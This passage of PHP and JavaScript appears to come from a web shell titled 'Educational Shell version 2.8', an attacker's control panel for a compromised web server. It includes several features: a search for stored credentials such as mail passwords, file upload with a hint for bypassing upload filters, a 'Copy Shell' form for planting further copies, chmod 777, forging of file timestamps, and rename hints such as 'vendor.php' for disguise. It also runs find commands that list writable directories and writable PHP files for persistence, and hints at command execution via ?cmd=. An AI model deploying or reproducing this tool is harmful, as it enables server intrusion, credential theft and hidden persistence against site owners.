                $info .= ($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-');
                $info .= ($perms & 0x0004) ? 'r' : '-';
                $info .= ($perms & 0x0002) ? 'w' : '-';
                $info .= ($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-');
                return $info;
            }
            function view_size($size)
            {
                if ($size >= 1073741824) return round($size / 1073741824, 2) . ' GB';
                if ($size >= 1048576) return round($size / 1048576, 2) . ' MB';
                if ($size >= 1024) return round($size / 1024, 2) . ' KB';
                return $size . ' B';
            }
            function search_files($dir, $search_term)
            {
                $results = [];
                $home_dir = '/home/' . get_current_user();
                // Determine search root
                $search_root = $home_dir;
                if (strpos(realpath($dir), realpath($home_dir)) === 0 || $dir === '/home' || $dir === '/') {
                    $search_root = realpath($dir);
                }
                try {
                    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($search_root, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
                    $self_path = realpath(__FILE__);
                    foreach ($iterator as $file) {
                        $file_path = $file->getPathname();
                        if ($file_path === $self_path) continue; // Skip the current script
                        if ($file->isFile() && is_readable($file) && ($content = @file_get_contents($file)) !== false) {
                            foreach (explode("\n", $content) as $line_num => $line) {
                                if (stripos($line, $search_term) !== false) {
                                    $results[] = ['file' => $file_path, 'line' => $line_num + 1, 'content' => htmlspecialchars(substr($line, 0, 100)) . (strlen($line) > 100 ? '...' : '')];
                                }
                            }
                        }
                    }
                } catch (Exception $e) {
                    return ['error' => 'Search error: ' . htmlspecialchars($e->getMessage())];
                }
                return $results;
            }

            function scandire($dir)
            {
                $dir = realpath($dir);
                if (!$dir || !is_dir($dir)) return 'Invalid directory';
                chdir($dir);
                $dirs = [];
                $files = [];
                if ($dh = opendir($dir)) {
                    while (($file = readdir($dh)) !== false) {
                        if (filetype($dir . '/' . $file) === 'dir') $dirs[] = $file;
                        if (filetype($dir . '/' . $file) === 'file') $files[] = $file;
                    }
                    closedir($dh);
                    sort($dirs);
                    sort($files);
                }
                $search_term = htmlspecialchars($_POST['search_term'] ?? '', ENT_QUOTES, 'UTF-8');
                $search_term = trim($search_term);
                $search_results = $search_term ? search_files($dir, $search_term) : [];
                $home_dir = '/home/' . get_current_user();
                $trash_dir = $home_dir . '/.local/share/Trash/files';
                if (!is_dir($trash_dir)) $trash_dir = $home_dir . '/.trash';
                echo '<table><tr><td><form method="POST">Open dir:<input type="text" name="dir" value="' . htmlspecialchars($dir) . '" size="50" style="margin-top:3px;"><input type="submit" value="GO"></form><form class="go-home-form" method="POST"><input type="hidden" name="action" value="viewer"><input type="hidden" name="dir" value="' . htmlspecialchars($home_dir) . '"><input type="submit" value="Go Home (public_html)"><a id="showsearchresult" class="showsearchresult" href="javascript:void(0)" onclick="document.getElementById(\'file-content-panelx\').classList.add(\'show\')" style="position:relative;cursor:pointer;color:#B9B9BD;text-decoration:none;padding:5px;border:1px solid #525252;margin-left:1px;">view file agan</a><p style="color:#757575;">Hint: Can also use ?cmd=</p></form></td><td style="position:absolute;margin:0 5px;"><div class="search-container"><form method="POST"><input type="text" name="search_term" value="' . htmlspecialchars($search_term ?? 'mail->Password') . '" placeholder="dbname, mail->Password" size="20"><input type="submit" value="Search"><a id="showsearchresult" class="showsearchresult" href="javascript:void(0)" onclick="document.getElementById(\'search-panel\').classList.add(\'show\')" style="position:relative;cursor:pointer;color:#B9B9BD;text-decoration:none;padding:5px;border:1px solid #525252;margin-left:1px;">show</a></form><p style="font-size:0.9em;color:#757575;">Hint: \'Search\' searches from ' . htmlspecialchars($home_dir) . '</p><form class="upload-form" method="POST" enctype="multipart/form-data"><input type="hidden" name="action" value="upload"><p style="font-size:0.9em;color:#757575;">uploading in .zip may bypass upload restrictions</p><input type="file" name="upload_file" style="padding: 2px;"><input type="submit" value="Upload"></form><form class="copy-shell-form" method="POST"><input type="hidden" name="action" value="copy_shell"><input type="text" name="target_dir" placeholder="/path/to/destination" size="20"><input type="submit" value="Copy Shell"></form><form class="create-file-form" style="display: grid;border: 1px solid dimgray;" onsubmit="createFile(event, \'' . htmlspecialchars($dir, ENT_QUOTES) . '\'); return false;"><input type="text" name="new_file_name" placeholder="newfile.php" size="20"><textarea name="new_file_content" rows="5" cols="20" placeholder="File content"></textarea><input type="submit" value="Create File"></form></div></td></tr>';
                echo '<tr><td><a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\'' . htmlspecialchars($trash_dir) . '\'; document.reqs.submit();">View Trash</a></td></tr>';
                echo '<tr><td><form method="POST" style="display:flex;align-items:center;">Show file:<input type="text" name="file" value="" placeholder="' . $home_dir . '/public_html/index.php" size="50"><input type="hidden" name="action" value="editor"><input type="submit" value="View"></form></td></tr>';
                echo '<tr><td><p style="font-size:0.9em;color:#757575;">Hint: \'writable paths (current dir)\' works better than \'all writable paths\'</p>
    <form method="POST" style="margin:1px;display:inline-flex;align-items:center;border:1px solid #696969;padding:3px;border-radius:4px;" id="form_writable_paths_current"><select name="sort_by" style="background:#696969;margin-right:5px;padding:3px;border:1px solid #696969;border-radius:4px;"><option value="string" selected>String</option><option value="size">Size</option><option value="date">Date</option></select><input type="hidden" name="action" value="writable_paths_current"><input type="submit" value="Writable Paths (Current Dir)" style="padding:5px 10px;border:1px solid #696969;border-radius:4px;cursor:pointer;" onclick="handleButtonClick(event,\'form_writable_paths_current\')"></form>
    <form method="POST" style="margin:1px;display:inline-flex;align-items:center;border:1px solid #696969;padding:3px;border-radius:4px;" id="form_non_writable_paths_current"><select name="sort_by" style="background:#696969;margin-right:5px;padding:3px;border:1px solid #696969;border-radius:4px;"><option value="string" selected>String</option><option value="size">Size</option><option value="date">Date</option></select><input type="hidden" name="action" value="non_writable_paths_current"><input type="submit" value="Non-writables (CD)" style="padding:5px 10px;border:1px solid #696969;border-radius:4px;cursor:pointer;" onclick="handleButtonClick(event,\'form_non_writable_paths_current\')"></form><br>
    <form method="POST" style="margin:1px;display:inline-flex;align-items:center;border:1px solid #696969;padding:3px;border-radius:4px;" id="form_writable_paths"><select name="sort_by" style="background:#696969;margin-right:5px;padding:3px;border:1px solid #696969;border-radius:4px;"><option value="string" selected>String</option><option value="size">Size</option><option value="date">Date</option></select><input type="hidden" name="action" value="writable_paths"><input type="submit" value="All Writable Paths" style="padding:5px 10px;border:1px solid #696969;border-radius:4px;cursor:pointer;" onclick="handleButtonClick(event,\'form_writable_paths\')"></form>
    <form method="POST" style="margin:1px;display:inline-flex;align-items:center;border:1px solid #696969;padding:3px;border-radius:4px;" id="form_writable_php_files"><select name="sort_by" style="background:#696969;margin-right:5px;padding:3px;border:1px solid #696969;border-radius:4px;"><option value="string" selected>String</option><option value="size">Size</option><option value="date">Date</option></select><input type="hidden" name="action" value="writable_php_files"><input type="submit" value="Writable PHP Files (CD)" style="padding:5px 10px;border:1px solid #696969;border-radius:4px;cursor:pointer;background:dimgray;" onclick="handleButtonClick(event,\'form_writable_php_files\')"></form>
    </td></tr>
    <script>function handleButtonClick(event,formId){const form=document.getElementById(formId);form.target=event.ctrlKey||event.metaKey?"_blank":"_self";}</script>';
                echo '<div id="search-panel" class="search-panel' . ($search_term ? ' show' : '') . '"><div style="display:flex;align-items:center;"><h3>Search Results for "' . htmlspecialchars($search_term ?? '') . '"</h3><span class="close-btn" onclick="document.getElementById(\'search-panel\').style.width=\'\';">→</span><span class="close-btn" onclick="document.getElementById(\'search-panel\').style.width=\'inherit\';">←</span><span class="close-btn" onclick="document.getElementById(\'search-panel\').classList.remove(\'show\');document.getElementById(\'showsearchresult\').classList.remove(\'showsearchresult\');">X</span></div>';
                if ($search_results) {
                    if (isset($search_results['error'])) echo '<p>' . $search_results['error'] . '</p>';
                    elseif (empty($search_results)) echo '<p>No results found for "' . htmlspecialchars($search_term) . '"</p>';
                    else foreach ($search_results as $result) echo '<p><a href="#" onclick="loadFileContent(\'' . htmlspecialchars($result['file'], ENT_QUOTES) . '\'); return false;">File: ' . htmlspecialchars($result['file']) . '</a><br>Line ' . $result['line'] . ': ' . $result['content'] . '</p>';
                }
                echo '</div>';
                if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                    echo '<tr><td>Select drive:';
                    for ($j = ord('C'); $j <= ord('Z'); $j++) if (@opendir(chr($j) . ':/')) echo '<a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\'' . chr($j) . ':/\'; document.reqs.submit();">' . chr($j) . '</a> ';
                    echo '</td></tr>';
                }
                echo '<tr><td>OS: ' . htmlspecialchars(php_uname()) . '</td></tr><tr><th class="name"><div class="tddiv"><span>Names &nbsp;(click any to view)</span><span>Last Modified</span></div></th><th class="type">Type</th><th class="size">Size</th><th class="permission">Permission</th><th class="options">Options</th></tr>';
                foreach ($dirs as $d) {
                    $link = $dir . '/' . $d;
                    $mtime = @filemtime($link);
                    $last_modified = $mtime ? date('M j, Y, h:i A', $mtime) : 'Unknown';
                    echo '<tr><td class="name"><div class="tddiv"><span><a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\'' . htmlspecialchars($link) . '\'; document.reqs.submit();">' . htmlspecialchars($d) . '</a></span><span style="font-size:0.92em;color:#b1b1b1;letter-spacing:-0.05em;"><a href="#" onclick="document.getElementById(\'change-date-form-' . htmlspecialchars($d, ENT_QUOTES) . '\').style.display=\'block\'; return false;">' . htmlspecialchars($last_modified) . '</a><form id="change-date-form-' . htmlspecialchars($d, ENT_QUOTES) . '" method="POST" style="display:none;margin-left:10px;" onsubmit="changeDate(event, \'' . htmlspecialchars($link, ENT_QUOTES) . '\', \'' . htmlspecialchars($dir, ENT_QUOTES) . '\'); return false;"><input type="hidden" name="action" value="change_date"><input type="hidden" name="file" value="' . htmlspecialchars($link) . '"><input type="text" name="new_date" value="' . htmlspecialchars($last_modified) . '" size="20"><input type="submit" value="Change Date"></form></span></div></td><td class="type">dir</td><td class="size"></td><td class="permission"><a href="#" onclick="if(confirm(\'Change permissions to 777 for ' . htmlspecialchars($d, ENT_QUOTES) . '?\')){changePerm(\'' . htmlspecialchars($link, ENT_QUOTES) . '\', \'' . htmlspecialchars($dir, ENT_QUOTES) . '\');}return false;">' . perms($link) . '</a></td><td class="options"><a href="#" onclick="document.reqs.action.value=\'download\'; document.reqs.file.value=\'' . htmlspecialchars($link) . '\'; document.reqs.submit();">Download ZIP</a></td></tr>';
                }
                foreach ($files as $f) {
                    $linkfile = $dir . '/' . $f;
                    $mtime = @filemtime($linkfile);
                    $last_modified = $mtime ? date('M j, Y, h:i A', $mtime) : 'Unknown';
                    echo '<tr><td class="name"><div class="tddiv"><span><a href="#" onclick="loadFileContent(\'' . htmlspecialchars($linkfile, ENT_QUOTES) . '\'); return false;">' . htmlspecialchars($f) . '</a></span><span style="font-size:0.92em;color:#b1b1b1;letter-spacing:-0.05em;"><a href="#" onclick="document.getElementById(\'change-date-form-' . htmlspecialchars($f, ENT_QUOTES) . '\').style.display=\'block\'; return false;">' . htmlspecialchars($last_modified) . '</a><form id="change-date-form-' . htmlspecialchars($f, ENT_QUOTES) . '" method="POST" style="display:none;margin-left:10px;" onsubmit="changeDate(event, \'' . htmlspecialchars($linkfile, ENT_QUOTES) . '\', \'' . htmlspecialchars($dir, ENT_QUOTES) . '\'); return false;"><input type="hidden" name="action" value="change_date"><input type="hidden" name="file" value="' . htmlspecialchars($linkfile) . '"><input type="text" name="new_date" value="' . htmlspecialchars($last_modified) . '" size="20"><input type="submit" value="Change Date"></form></span></div></td><td class="type">file</td><td class="size">' . view_size(filesize($linkfile)) . '</td><td class="permission"><a href="#" onclick="if(confirm(\'Change permissions to 777 for ' . htmlspecialchars($f, ENT_QUOTES) . '?\')){changePerm(\'' . htmlspecialchars($linkfile, ENT_QUOTES) . '\', \'' . htmlspecialchars($dir, ENT_QUOTES) . '\');}return false;">' . perms($linkfile) . '</a></td><td class="options"><a href="#" onclick="document.reqs.action.value=\'download\'; document.reqs.file.value=\'' . htmlspecialchars($linkfile) . '\'; document.reqs.submit();">Download</a> | <a href="#" onclick="loadFileEdit(\'' . htmlspecialchars($linkfile, ENT_QUOTES) . '\'); return false;">Edit</a> | <a href="#" onclick="showRenameForm(\'' . htmlspecialchars($f, ENT_QUOTES) . '\', \'' . htmlspecialchars($linkfile, ENT_QUOTES) . '\'); return false;">Rename</a> | <a href="#" onclick="if(confirm(\'Permanently delete ' . htmlspecialchars($f, ENT_QUOTES) . ' (no thrash)?\')){deleteFile(\'' . htmlspecialchars($linkfile, ENT_QUOTES) . '\', \'' . htmlspecialchars($dir, ENT_QUOTES) . '\');}return false;">Delete</a><form id="rename-form-' . htmlspecialchars($f, ENT_QUOTES) . '" style="display:none;"><input type="text" name="new_name" placeholder="vendor.php, widgets.php"><input type="button" value="Rename" onclick="renameFile(\'' . htmlspecialchars($linkfile, ENT_QUOTES) . '\', this.previousElementSibling.value, \'' . htmlspecialchars($dir, ENT_QUOTES) . '\');"></form></td></tr>';
                }
                echo '</table>';
            ?>
                <script>
                    function loadFileContent(path) {
                        let existingPanel = document.getElementById('file-content-panel');
                        if (existingPanel) existingPanel.remove();
                        let panel = document.createElement('div');
                        panel.id = 'file-content-panel';
                        document.body.appendChild(panel);
                        fetch(window.location.href, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded'
                            },
                            body: 'ajax_read_file=' + encodeURIComponent(path)
                        }).then(response => response.text()).then(html => {
                            panel.innerHTML = html;
                        }).catch(error => {
                            panel.innerHTML = '<div class="file-content-panel show"><span class="close-btn" onclick="document.getElementById(\'file-content-panel\').classList.remove(\'show\')">X</span><p>Error loading file: ' + error.message + '</p></div>';
                        });
                    }

                    function loadFileEdit(path) {
                        let existingPanel = document.getElementById('file-content-panel');
                        if (existingPanel) existingPanel.remove();
                        let panel = document.createElement('div');
                        panel.id = 'file-content-panel';
                        document.body.appendChild(panel);
                        fetch(window.location.href, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded'
                            },
                            body: 'ajax_edit_file=' + encodeURIComponent(path)
                        }).then(response => response.text()).then(html => {
                            panel.innerHTML = html;
                        }).catch(error => {
                            panel.innerHTML = '<div class="file-content-panel show"><span class="close-btn" onclick="document.getElementById(\'file-content-panel\').classList.remove(\'show\')">X</span><p>Error loading file: ' + error.message + '</p></div>';
                        });
                    }

                    function saveFileContent(event, path) {
                        event.preventDefault();
                        let form = event.target;
                        let content = form.querySelector('textarea[name="content"]').value;
                        let existingPanel = document.getElementById('file-content-panel');
                        fetch(window.location.href, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded'
                            },
                            body: 'ajax_save_file=' + encodeURIComponent(path) + '&content=' + encodeURIComponent(content)
                        }).then(response => response.text()).then(html => {
                            document.getElementById('message-area').innerHTML = html;
                            setTimeout(() => {
                                loadFileContent(path);
                                refreshFileTable('<?php echo htmlspecialchars($dir, ENT_QUOTES); ?>');
                            }, 1000);
                        }).catch(error => {
                            existingPanel.innerHTML = '<div class="file-content-panel show"><span class="close-btn" onclick="document.getElementById(\'file-content-panel\').classList.remove(\'show\')">X</span><p>Error saving file: ' + error.message + '</p></div>';
                        });
                    }

                    function createFile(event, dir) {
                        event.preventDefault();
                        let form = event.target;
                        let newFileName = form.querySelector('input[name="new_file_name"]').value;
                        let newFileContent = form.querySelector('textarea[name="new_file_content"]').value;
                        document.getElementById('message-area').innerHTML = '';
                        fetch(window.location.href, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded'
                            },
                            body: 'ajax_create_file=1&current_dir=' + encodeURIComponent(dir) + '&new_file_name=' + encodeURIComponent(newFileName) + '&new_file_content=' + encodeURIComponent(newFileContent)
                        }).then(response => response.text()).then(html => {
                            document.getElementById('message-area').innerHTML = html;
                            setTimeout(() => refreshFileTable(dir), 1000);
                        }).catch(error => {
                            document.getElementById('message-area').innerHTML = '<p>Error creating file: ' + error.message + '</p>';
                        });
                    }

                    function deleteFile(path, dir) {
                        document.getElementById('message-area').innerHTML = '';
                        fetch(window.location.href, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded'
                            },
                            body: 'ajax_delete_file=' + encodeURIComponent(path)
                        }).then(response => response.text()).then(html => {
                            document.getElementById('message-area').innerHTML = html;
                            setTimeout(() => refreshFileTable(dir), 1000);
                        }).catch(error => {
                            document.getElementById('message-area').innerHTML = '<p>Error deleting file: ' + error.message + '</p>';
                        });
                    }

                    function showRenameForm(filename, path) {
                        let form = document.getElementById('rename-form-' + filename);
                        form.style.display = 'block';
                    }

                    function renameFile(path, newName, dir) {
                        document.getElementById('message-area').innerHTML = '';
                        fetch(window.location.href, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded'
                            },
                            body: 'ajax_rename_file=' + encodeURIComponent(path) + '&new_name=' + encodeURIComponent(newName)
                        }).then(response => response.text()).then(html => {
                            document.getElementById('message-area').innerHTML = html;
                            setTimeout(() => refreshFileTable(dir), 1000);
                        }).catch(error => {
                            document.getElementById('message-area').innerHTML = '<p>Error renaming file: ' + error.message + '</p>';
                        });
                    }

                    function refreshFileTable(dir) {
                        fetch(window.location.href, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded'
                            },
                            body: 'ajax_scandir=' + encodeURIComponent(dir)
                        }).then(response => response.text()).then(html => {
                            document.getElementById('file-table').innerHTML = html;
                        }).catch(error => {
                            console.error('Error refreshing table:', error);
                        });
                    }

                    function changePerm(path, dir) {
                        document.getElementById('message-area').innerHTML = '';
                        fetch(window.location.href, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded'
                            },
                            body: 'action=chmod&file=' + encodeURIComponent(path)
                        }).then(response => response.text()).then(html => {
                            document.getElementById('message-area').innerHTML = html;
                            refreshFileTable(dir);
                        }).catch(error => {
                            document.getElementById('message-area').innerHTML = '<p>Error changing permissions: ' + error.message + '</p>';
                        });
                    }

                    function changeDate(event, path, dir) {
                        event.preventDefault();
                        let form = event.target;
                        let newDate = form.querySelector('input[name="new_date"]').value;
                        document.getElementById('message-area').innerHTML = '';
                        fetch(window.location.href, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded'
                            },
                            body: 'action=change_date&file=' + encodeURIComponent(path) + '&new_date=' + encodeURIComponent(newDate)
                        }).then(response => response.text()).then(html => {
                            document.getElementById('message-area').innerHTML = html;
                            refreshFileTable(dir);
                        }).catch(error => {
                            document.getElementById('message-area').innerHTML = '<p>Error changing date: ' + error.message + '</p>';
                        });
                    }
                    document.querySelector('.upload-form').addEventListener('submit', function(event) {
                        event.preventDefault();
                        let formData = new FormData(this);
                        document.getElementById('message-area').innerHTML = '';
                        fetch(window.location.href, {
                            method: 'POST',
                            body: formData
                        }).then(response => response.text()).then(html => {
                            document.getElementById('message-area').innerHTML = html;
                            refreshFileTable('<?php echo htmlspecialchars($dir, ENT_QUOTES); ?>');
                        }).catch(error => {
                            document.getElementById('message-area').innerHTML = '<p>Error uploading: ' + error.message + '</p>';
                        });
                    });
                    document.querySelector('.copy-shell-form').addEventListener('submit', function(event) {
                        event.preventDefault();
                        let formData = new FormData(this);
                        document.getElementById('message-area').innerHTML = '';
                        fetch(window.location.href, {
                            method: 'POST',
                            body: formData
                        }).then(response => response.text()).then(html => {
                            document.getElementById('message-area').innerHTML = html;
                            setTimeout(() => location.reload(), 1000);
                        }).catch(error => {
                            document.getElementById('message-area').innerHTML = '<p>Error copying shell: ' + error.message + '</p>';
                        });
                    });
                </script>
            <?php
            }
            if ($action === 'viewer') scandire($dir);
            function writef($file, $data)
            {
                if (!is_writable($file)) {
                    @chmod($file, 0644);
                    if (!is_writable($file)) return "Cannot write to $file: Permission denied or server restrictions";
                }
                $fp = @fopen($file, 'w');
                if ($fp === false) return "Failed to open $file for writing: " . error_get_last()['message'];
                $success = fwrite($fp, $data);
                fclose($fp);
                return $success !== false ?: "Failed to write to $file: " . error_get_last()['message'];
            }
            function readf($file)
            {
                return is_readable($file) ? htmlspecialchars(file_get_contents($file)) : 'Cannot open file: Permission denied';
            }
            if ($action === 'editor' && isset($_POST['file'])) {
                $file = realpath($_POST['file']);
                if (!$file || !file_exists($file)) {
                    echo '<p>Invalid file path: ' . htmlspecialchars($_POST['file']) . '</p>';
                    $_SESSION['action'] = 'viewer';
                    exit;
                }
                echo '<p>Use the "Edit" link in the file options to edit files via AJAX popup.</p>';
                $_SESSION['action'] = 'viewer';
                exit;
            }
            if ($action === 'change_date' && isset($_POST['file'], $_POST['new_date'])) {
                $file = realpath($_POST['file']);
                $new_date = trim($_POST['new_date']);
                if (!$file || !file_exists($file)) {
                    echo '<p>Invalid file path: ' . htmlspecialchars($_POST['file']) . '</p>';
                    if (is_ajax()) {
                        ob_end_flush();
                        exit;
                    }
                    $_SESSION['action'] = 'viewer';
                    exit;
                }
                if (($date_time = DateTime::createFromFormat('M j, Y, h:i A', $new_date)) === false) {
                    echo '<p>Invalid date format. Use: Jun 14, 2025, 08:04 PM</p>';
                    if (is_ajax()) {
                        ob_end_flush();
                        exit;
                    }
                    $_SESSION['action'] = 'viewer';
                    exit;
                }
                $touch_format = $date_time->format('YmdHi');
                if (!preg_match('/^\d{12}$/', $touch_format)) {
                    echo '<p>Invalid timestamp generated: ' . htmlspecialchars($touch_format) . '</p>';
                    if (is_ajax()) {
                        ob_end_flush();
                        exit;
                    }
                    $_SESSION['action'] = 'viewer';
                    exit;
                }
                $output = shell_exec_alternative('touch -t ' . $touch_format . ' ' . escapeshellarg($file), true);
                echo empty($output) || strpos($output, 'error') === false ? '<p>Last modified date changed for ' . htmlspecialchars($file) . ' to ' . htmlspecialchars($new_date) . '</p>' : '<p>Failed to change date for ' . htmlspecialchars($file) . ': ' . htmlspecialchars($output) . '</p>';
                if (is_ajax()) {
                    ob_end_flush();
                    exit;
                }
                $_SESSION['action'] = 'viewer';
                echo '<script>document.getElementById("message-area").innerHTML = document.getElementById("message-area").innerHTML; refreshFileTable(\'' . htmlspecialchars($dir, ENT_QUOTES) . '\');</script>';
            }
            if ($action === 'writable_paths') {
                $sort_by = $_POST['sort_by'] ?? 'string';
                $sort_cmd = match ($sort_by) {
                    'size' => '| sort -k2 -nr',
                    'date' => '| sort -k3 -nr',
                    default => '| sort -k1 -nr'
                };
                $cmd = 'find / -type d -writable -exec stat --format="%n %s %Y" {} + 2>/dev/null | grep -vE "^\./?\.$" | awk \'{print length($1) " " $2 " " $3 " " $1}\' ' . $sort_cmd . ' | awk \'{print $1 " " $2 " " strftime("%b_%d_%Y_%I:%M%p", $3) " " $4}\'';
                $output = shell_exec_alternative($cmd, true);
                if (empty($output)) {
                    $output = 'No writable paths found';
                } else {
                    $lines = explode("\n", trim($output));
                    $formatted_output = '';
                    foreach ($lines as $line) if (preg_match('/^(\d+)\s+(\d+)\s+(.+?)\s+(.+)$/', $line, $matches)) $formatted_output .= "Len:{$matches[1]} " . format_size($matches[2]) . " {$matches[3]} {$matches[4]}\n";
                    $output = $formatted_output ?: 'No writable paths found';
                }
                echo '<div class="writable-paths"><h3>All Writable Paths [<span>Sorted by ' . htmlspecialchars($sort_by) . '</span>]</h3><pre>' . htmlspecialchars($output) . '</pre></div>';
                $_SESSION['action'] = 'viewer';
            }
            if ($action === 'writable_paths_current') {
                $target_dir = realpath($_SESSION['dir']);
                $sort_by = $_POST['sort_by'] ?? 'string';
                if (!$target_dir || !is_dir($target_dir)) {
                    echo '<div class="writable-paths"><h3>Writable Paths (Current Directory)</h3><pre>Invalid directory: ' . htmlspecialchars($_SESSION['dir']) . '</pre></div>';
                } else {
                    $sort_cmd = match ($sort_by) {
                        'size' => '| sort -k2 -nr',
                        'date' => '| sort -k3 -nr',
                        default => '| sort -k1 -nr'
                    };
                    $cmd = 'find ' . escapeshellarg($target_dir) . ' -type d -writable -exec stat --format="%n %s %Y" {} + 2>/dev/null | grep -vE "^\./?\.$" | awk \'{print length($1) " " $2 " " $3 " " $1}\' ' . $sort_cmd . ' | awk \'{print $1 " " $2 " " strftime("%b_%d_%Y_%I:%M%p", $3) " " $4}\'';
                    $output = shell_exec_alternative($cmd, true);
                    if (empty($output)) {
                        $output = 'No writable paths found';
                    } else {
                        $lines = explode("\n", trim($output));
                        $formatted_output = '';
                        foreach ($lines as $line) if (preg_match('/^(\d+)\s+(\d+)\s+(.+?)\s+(.+)$/', $line, $matches)) $formatted_output .= "Len:{$matches[1]} " . format_size($matches[2]) . " {$matches[3]} {$matches[4]}\n";
                        $output = $formatted_output ?: 'No writable paths found';
                    }
                    echo '<div class="writable-paths"><h3>Writable Paths (' . htmlspecialchars($target_dir) . ') [<span>Sorted by ' . htmlspecialchars($sort_by) . '</span>]</h3><pre>' . htmlspecialchars($output) . '</pre></div>';
                }
                $_SESSION['action'] = 'viewer';
            }
            if ($action === 'non_writable_paths_current') {
                $target_dir = realpath($_SESSION['dir']);
                $sort_by = $_POST['sort_by'] ?? 'string';
                if (!$target_dir || !is_dir($target_dir)) {
                    echo '<div class="writable-paths"><h3>Non-Writable Paths (Current Directory)</h3><pre>Invalid directory: ' . htmlspecialchars($_SESSION['dir']) . '</pre></div>';
                } else {
                    $sort_cmd = match ($sort_by) {
                        'size' => '| sort -k2 -nr',
                        'date' => '| sort -k3 -nr',
                        default => '| sort -k1 -nr'
                    };
                    $cmd = 'find ' . escapeshellarg($target_dir) . ' -type d ! -writable -exec stat --format="%n %s %Y" {} + 2>/dev/null | grep -vE "^\./?\.$" | awk \'{print length($1) " " $2 " " $3 " " $1}\' ' . $sort_cmd . ' | awk \'{print $1 " " $2 " " strftime("%b_%d_%Y_%I:%M%p", $3) " " $4}\'';
                    $output = shell_exec_alternative($cmd, true);
                    if (empty($output)) {
                        $output = 'No non-writable paths found';
                    } else {
                        $lines = explode("\n", trim($output));
                        $formatted_output = '';
                        foreach ($lines as $line) if (preg_match('/^(\d+)\s+(\d+)\s+(.+?)\s+(.+)$/', $line, $matches)) $formatted_output .= "Len:{$matches[1]} " . format_size($matches[2]) . " {$matches[3]} {$matches[4]}\n";
                        $output = $formatted_output ?: 'No non-writable paths found';
                    }
                    echo '<div class="writable-paths"><h3>Non-Writable Paths (' . htmlspecialchars($target_dir) . ') [<span>Sorted by ' . htmlspecialchars($sort_by) . '</span>]</h3><pre>' . htmlspecialchars($output) . '</pre></div>';
                }
                $_SESSION['action'] = 'viewer';
            }
            if ($action === 'writable_php_files') {
                $target_dir = realpath($_SESSION['dir']);
                $sort_by = $_POST['sort_by'] ?? 'string';
                if (!$target_dir || !is_dir($target_dir)) {
                    echo '<div class="writable-paths"><h3>Writable PHP Files (Current Directory)</h3><pre>Invalid directory: ' . htmlspecialchars($_SESSION['dir']) . '</pre></div>';
                } else {
                    $sort_cmd = match ($sort_by) {
                        'size' => '| sort -k2 -nr',
                        'date' => '| sort -k3 -nr',
                        default => '| sort -k1 -nr'
                    };
                    $cmd = 'find ' . escapeshellarg($target_dir) . ' -type f -name "*.php" -writable -exec stat --format="%n %s %Y" {} + 2>/dev/null | awk \'{print length($1) " " $2 " " $3 " " $1}\' ' . $sort_cmd . ' | awk \'{print $1 " " $2 " " strftime("%b_%d_%Y_%I:%M%p", $3) " " $4}\'';
                    $output = shell_exec_alternative($cmd, true);
                    if (empty($output)) {
                        $output = 'No writable PHP files found';
                    } else {
                        $lines = explode("\n", trim($output));
                        $formatted_output = '';
                        foreach ($lines as $line) if (preg_match('/^(\d+)\s+(\d+)\s+(.+?)\s+(.+)$/', $line, $matches)) $formatted_output .= "Len:{$matches[1]} " . format_size($matches[2]) . " {$matches[3]} {$matches[4]}\n";
                        $output = $formatted_output ?: 'No writable PHP files found';
                    }
                    echo '<div class="writable-paths"><h3>Writable PHP Files (' . htmlspecialchars($target_dir) . ') [<span>Sorted by ' . htmlspecialchars($sort_by) . '</span>]</h3><pre>' . htmlspecialchars($output) . '</pre></div>';
                }
                $_SESSION['action'] = 'viewer';
            }
            if ($action === 'conn_db') {
                echo '<form method="POST"><input type="hidden" name="action" value="conn_db"><table><tr><td>Host:</td><td><input type="text" name="db_host" value="localhost"></td></tr><tr><td>User:</td><td><input type="text" name="db_user"></td></tr><tr><td>Password:</td><td><input type="password" name="db_pass"></td></tr><tr><td>Database:</td><td><input type="text" name="db_name"></td></tr><tr><td></td><td><input type="submit" value="Connect"></td></tr></table></form>';
                $_SESSION['action'] = 'viewer';
            }
            ?>
        </td>
    </tr>
</table>
<table width="100%" bgcolor="#336600" border="0" cellspacing="0" cellpadding="0">
    <tr>
        <td><a href="#">Educational Shell version 2.8</a></td>
    </tr>
</table>
<?php echo $footer; ?>